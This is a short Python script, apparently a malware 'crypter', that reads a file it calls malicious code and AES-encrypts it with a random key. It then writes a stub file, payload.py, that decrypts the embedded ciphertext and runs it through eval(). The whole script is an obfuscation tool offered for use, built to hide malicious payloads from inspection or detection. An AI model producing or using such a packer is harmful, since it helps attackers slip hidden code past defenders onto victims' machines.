from Crypto.Cipher import AES
import random
import string

if __name__ == "__main__":

    # read malicious filename, open the file
    maliciousFile = open(input("Enter path to malicious file: "), "r")
    maliciousCode = maliciousFile.read().encode("utf-8")
    maliciousFile.close()

    # generate random key and create a cipher object
    key = ''.join(random.choices(string.ascii_letters, k=16)).encode("utf-8")
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce

    # encrypt the malicious code
    ciphertext, tag = cipher.encrypt_and_digest(maliciousCode)

    # this is the combiner. It combines the ciphertext and the stub into a single file
    payload = 'from Crypto.Cipher import AES' + '\nkey = "' + key.decode("utf-8") + '"\nnonce = ' + str(nonce) + '\ncipher = AES.new(key.encode("utf-8"), ' + str(AES.MODE_EAX) + ', nonce=nonce)' + '\nplaintext = cipher.decrypt(' + str(ciphertext) + ').decode("utf-8")' + '\neval(plaintext)'

    # write the payload to a file
    payloadFile = open('payload.py', 'w')
    payloadFile.write(payload)
    payloadFile.close()